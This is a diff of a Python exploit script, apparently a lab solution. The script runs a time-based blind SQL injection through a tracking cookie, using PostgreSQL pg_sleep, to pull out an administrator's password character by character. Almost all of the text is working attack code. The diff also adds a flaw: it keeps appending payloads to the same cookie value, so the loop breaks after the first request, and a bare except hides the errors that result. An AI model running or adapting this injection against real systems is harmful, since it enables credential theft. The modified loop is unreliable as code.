@@ -14,29 +14,37 @@ def main():
         sys.exit(-1)
     print('[+] Retrieving Administrator Password...')
 
+    cookies = {'TrackingId':'H5b3xXdQwaDhYb6l', 'session':'b1bPmuVAJLehwfM3fXAqf9VQKyKSVpZu'}
     extracted_password = ''
-    for i in range(1,21):
-  
-        for j in range(32,126):
-            current_chr = chr(j)
+    try:
+        for i in range(1,21):
+    
+            for j in range(32,126):
+                current_chr = chr(j)
 
-            sqli_payload = f"'|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{current_chr}') THEN pg_sleep(5) ELSE pg_sleep(-1) END from users) --"
-            encoded_sqli_payload = urllib.parse.quote(sqli_payload)
+                sqli_payload = f"'|| (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{current_chr}') THEN pg_sleep(5) ELSE pg_sleep(-1) END from users) --"
+                encoded_sqli_payload = urllib.parse.quote(sqli_payload)
 
-            cookies = {'TrackingId':'H5b3xXdQwaDhYb6l' + encoded_sqli_payload, 'session':'b1bPmuVAJLehwfM3fXAqf9VQKyKSVpZu'}
-            
-            url = sys.argv[1]
-            response = req.get(url, cookies=cookies, proxies=proxies, verify=False)
+                cookies['TrackingId'] += encoded_sqli_payload
+                url = sys.argv[1]
+                
+                response = req.get(url, cookies=cookies, proxies=proxies, verify=False)
 
-            if response.elapsed.total_seconds() > 5:
-                extracted_password += current_chr
-                sys.stdout.write('\r' + extracted_password)
-                sys.stdout.flush()
-                break
-            else:
-                sys.stdout.write('\r' + extracted_password + current_chr)
-                sys.stdout.flush()
-        
+                if response.elapsed.total_seconds() > 5:
+                    extracted_password += current_chr
+                    sys.stdout.write('\r' + extracted_password)
+                    sys.stdout.flush()
+                    break
+                else:
+                    sys.stdout.write('\r' + extracted_password + current_chr)
+                    sys.stdout.flush()
+
+    except KeyboardInterrupt:
+        sys.stdout.write('\n')
+        print('Exiting...')
+    except:
+        print('An error occurred')
+
     return extracted_password
 
 
